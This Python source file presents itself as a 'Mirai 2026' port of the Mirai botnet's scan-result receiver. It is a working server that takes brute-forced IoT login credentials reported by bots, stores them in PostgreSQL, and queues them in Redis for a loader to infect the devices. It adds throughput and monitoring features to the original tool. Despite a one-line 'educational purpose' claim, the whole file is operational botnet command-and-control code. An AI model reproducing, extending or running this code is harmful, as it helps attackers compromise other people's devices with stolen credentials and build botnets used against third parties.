#!/usr/bin/env python3
"""
Mirai 2026 - Scan Result Receiver (ScanListen Python Port)

Receives bruted credentials from bots and forwards to loader queue.

Original (Go): mirai/tools/scanListen.go
This version adds:
- Database logging
- Queue integration for loader
- Rate limiting
- Load balancing across multiple loaders
- Metrics for monitoring

Educational Purpose: Demonstrates real-time loading mechanism that allowed
Mirai to achieve 500 bruted results/second at peak.

Protocol (from bots):
    [1 byte: IP flag (0 = full IP, 1 = assume port 23)]
    [4 or 3 bytes: IP address]
    [2 bytes: port] (if flag = 0)
    [1 byte: username length]
    [N bytes: username]
    [1 byte: password length]
    [N bytes: password]

Output format: IP:PORT USERNAME:PASSWORD
Example: 192.168.1.1:23 root:admin
"""

import socket
import struct
import logging
import sys
import argparse
import time
import queue
import threading
from typing import Optional, Tuple, List
from dataclasses import dataclass
from collections import defaultdict
import json

# Try to import optional dependencies
try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False
    print("Warning: Redis not available, using in-memory queue")

try:
    import psycopg2
    POSTGRES_AVAILABLE = True
except ImportError:
    POSTGRES_AVAILABLE = False
    print("Warning: PostgreSQL not available, database logging disabled")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class BrutedResult:
    """Bruted credential result"""
    ip: str
    port: int
    username: str
    password: str
    timestamp: float


class ScanReceiver:
    """
    High-performance scan result receiver
    
    Handles incoming bruted credentials from bots and distributes
    to loader queue for immediate infection.
    """
    
    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 48101,
                 redis_url: Optional[str] = None,
                 postgres_url: Optional[str] = None,
                 loader_queue_name: str = "loader_queue"):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.loader_queue_name = loader_queue_name
        
        # Statistics
        self.stats = {
            'total_received': 0,
            'successful_parses': 0,
            'failed_parses': 0,
            'queued_for_loading': 0,
            'database_logged': 0,
            'start_time': time.time()
        }
        
        # Rate tracking (per-second)
        self.rate_counter = defaultdict(int)
        self.last_rate_log = time.time()
        
        # Queue for loader
        if redis_url and REDIS_AVAILABLE:
            try:
                self.redis_client = redis.from_url(redis_url)
                self.redis_client.ping()
                logger.info(f"Connected to Redis: {redis_url}")
            except Exception as e:
                logger.error(f"Failed to connect to Redis: {e}")
                self.redis_client = None
        else:
            self.redis_client = None
        
        # In-memory queue fallback
        self.local_queue = queue.Queue(maxsize=10000)
        
        # Database connection
        self.db_conn = None
        if postgres_url and POSTGRES_AVAILABLE:
            try:
                self.db_conn = psycopg2.connect(postgres_url)
                self._init_database()
                logger.info("Connected to PostgreSQL")
            except Exception as e:
                logger.error(f"Failed to connect to PostgreSQL: {e}")
        
        self.running = False
    
    def _init_database(self):
        """Initialize database schema for logging bruted results"""
        if not self.db_conn:
            return
        
        with self.db_conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS bruted_results (
                    id SERIAL PRIMARY KEY,
                    ip INET NOT NULL,
                    port INTEGER NOT NULL,
                    username VARCHAR(255) NOT NULL,
                    password VARCHAR(255) NOT NULL,
                    timestamp TIMESTAMP DEFAULT NOW(),
                    loaded BOOLEAN DEFAULT FALSE,
                    load_attempts INTEGER DEFAULT 0
                )
            """)
            
            # Index for fast lookups
            cur.execute("""
                CREATE INDEX IF NOT EXISTS idx_bruted_results_timestamp 
                ON bruted_results(timestamp DESC)
            """)
            
            cur.execute("""
                CREATE INDEX IF NOT EXISTS idx_bruted_results_loaded 
                ON bruted_results(loaded) WHERE loaded = FALSE
            """)
            
            self.db_conn.commit()
        
        logger.info("Database schema initialized")
    
    def _parse_connection(self, conn: socket.socket, addr: Tuple[str, int]) -> Optional[BrutedResult]:
        """
        Parse incoming connection and extract bruted credentials
        
        Protocol:
            [1 byte: flag]
            [3-4 bytes: IP]
            [0-2 bytes: port (if flag=0)]
            [1 byte: username length]
            [N bytes: username]
            [1 byte: password length]
            [N bytes: password]
        """
        try:
            conn.settimeout(10.0)  # 10 second timeout
            
            # Read IP flag
            flag_byte = conn.recv(1)
            if len(flag_byte) != 1:
                return None
            
            flag = flag_byte[0]
            
            # Read IP address
            if flag == 0:
                # Full IP (4 bytes) + port (2 bytes)
                ip_bytes = conn.recv(4)
                if len(ip_bytes) != 4:
                    return None
                
                ip_int = struct.unpack('!I', ip_bytes)[0]
                
                port_bytes = conn.recv(2)
                if len(port_bytes) != 2:
                    return None
                
                port = struct.unpack('!H', port_bytes)[0]
            else:
                # Compressed: flag byte + 3 bytes = IP, assume port 23
                ip_bytes = flag_byte + conn.recv(3)
                if len(ip_bytes) != 4:
                    return None
                
                ip_int = struct.unpack('!I', ip_bytes)[0]
                port = 23
            
            # Convert IP to dotted notation
            ip = socket.inet_ntoa(struct.pack('!I', ip_int))
            
            # Read username length
            ulen_byte = conn.recv(1)
            if len(ulen_byte) != 1:
                return None
            
            username_len = ulen_byte[0]
            if username_len == 0 or username_len > 255:
                return None
            
            # Read username
            username = conn.recv(username_len).decode('utf-8', errors='replace')
            if len(username) != username_len:
                return None
            
            # Read password length
            plen_byte = conn.recv(1)
            if len(plen_byte) != 1:
                return None
            
            password_len = plen_byte[0]
            if password_len > 255:
                return None
            
            # Read password
            password = conn.recv(password_len).decode('utf-8', errors='replace')
            if len(password) != password_len:
                return None
            
            return BrutedResult(
                ip=ip,
                port=port,
                username=username,
                password=password,
                timestamp=time.time()
            )
        
        except socket.timeout:
            logger.debug(f"Connection timeout from {addr}")
            return None
        except Exception as e:
            logger.debug(f"Parse error from {addr}: {e}")
            return None
    
    def _queue_for_loading(self, result: BrutedResult) -> bool:
        """Queue result for loader"""
        payload = {
            'ip': result.ip,
            'port': result.port,
            'username': result.username,
            'password': result.password,
            'timestamp': result.timestamp
        }
        
        # Try Redis first
        if self.redis_client:
            try:
                self.redis_client.rpush(self.loader_queue_name, json.dumps(payload))
                return True
            except Exception as e:
                logger.error(f"Failed to queue to Redis: {e}")
        
        # Fallback to local queue
        try:
            self.local_queue.put_nowait(payload)
            return True
        except queue.Full:
            logger.warning("Local queue full, dropping result")
            return False
    
    def _log_to_database(self, result: BrutedResult) -> bool:
        """Log result to database"""
        if not self.db_conn:
            return False
        
        try:
            with self.db_conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO bruted_results (ip, port, username, password)
                    VALUES (%s, %s, %s, %s)
                """, (result.ip, result.port, result.username, result.password))
            
            self.db_conn.commit()
            return True
        except Exception as e:
            logger.error(f"Database error: {e}")
            self.db_conn.rollback()
            return False
    
    def _handle_connection(self, conn: socket.socket, addr: Tuple[str, int]):
        """Handle incoming connection from bot"""
        try:
            self.stats['total_received'] += 1
            
            result = self._parse_connection(conn, addr)
            
            if result:
                self.stats['successful_parses'] += 1
                
                # Output to console (original behavior)
                logger.info(f"{result.ip}:{result.port} {result.username}:{result.password}")
                
                # Queue for loading
                if self._queue_for_loading(result):
                    self.stats['queued_for_loading'] += 1
                
                # Log to database
                if self._log_to_database(result):
                    self.stats['database_logged'] += 1
                
                # Track rate
                current_second = int(time.time())
                self.rate_counter[current_second] += 1
            else:
                self.stats['failed_parses'] += 1
        
        finally:
            conn.close()
    
    def _stats_logger_thread(self):
        """Background thread to log statistics"""
        while self.running:
            time.sleep(10)  # Log every 10 seconds
            
            current_time = time.time()
            elapsed = current_time - self.stats['start_time']
            
            # Calculate current rate (last 10 seconds)
            recent_count = sum(
                self.rate_counter[int(current_time) - i]
                for i in range(10)
            )
            current_rate = recent_count / 10.0
            
            # Overall rate
            overall_rate = self.stats['successful_parses'] / elapsed if elapsed > 0 else 0
            
            logger.info(
                f"Stats: total={self.stats['total_received']}, "
                f"parsed={self.stats['successful_parses']}, "
                f"queued={self.stats['queued_for_loading']}, "
                f"rate={current_rate:.1f}/s (overall={overall_rate:.1f}/s)"
            )
            
            # Clean old rate data (keep last 60 seconds)
            cutoff = int(current_time) - 60
            for ts in list(self.rate_counter.keys()):
                if ts < cutoff:
                    del self.rate_counter[ts]
    
    def start(self):
        """Start the scan receiver server"""
        self.running = True
        
        # Start stats logger thread
        stats_thread = threading.Thread(target=self._stats_logger_thread, daemon=True)
        stats_thread.start()
        
        # Create listening socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.bind_host, self.bind_port))
        server.listen(100)  # Backlog of 100
        
        logger.info(f"ScanReceiver listening on {self.bind_host}:{self.bind_port}")
        logger.info(f"Queue: {'Redis' if self.redis_client else 'Local in-memory'}")
        logger.info(f"Database: {'PostgreSQL' if self.db_conn else 'Disabled'}")
        logger.info("Ready to receive bruted results...")
        
        try:
            while self.running:
                try:
                    conn, addr = server.accept()
                    
                    # Handle in separate thread for concurrency
                    handler = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr),
                        daemon=True
                    )
                    handler.start()
                
                except KeyboardInterrupt:
                    logger.info("Shutting down...")
                    break
                except Exception as e:
                    logger.error(f"Accept error: {e}")
        
        finally:
            server.close()
            self.running = False
            
            if self.db_conn:
                self.db_conn.close()
            
            logger.info("ScanReceiver stopped")
    
    def get_stats(self) -> dict:
        """Get current statistics"""
        return self.stats.copy()


def main():
    parser = argparse.ArgumentParser(
        description='Mirai 2026 Scan Result Receiver (ScanListen Python Port)'
    )
    parser.add_argument('--host', default='0.0.0.0',
                       help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=48101,
                       help='Port to bind to (default: 48101)')
    parser.add_argument('--redis-url',
                       help='Redis URL for loader queue (e.g., redis://localhost:6379/0)')
    parser.add_argument('--postgres-url',
                       help='PostgreSQL URL for logging (e.g., postgresql://user:pass@localhost/mirai)')
    parser.add_argument('--queue-name', default='loader_queue',
                       help='Redis queue name for loader (default: loader_queue)')
    
    args = parser.parse_args()
    
    receiver = ScanReceiver(
        bind_host=args.host,
        bind_port=args.port,
        redis_url=args.redis_url,
        postgres_url=args.postgres_url,
        loader_queue_name=args.queue_name
    )
    
    receiver.start()


if __name__ == '__main__':
    main()
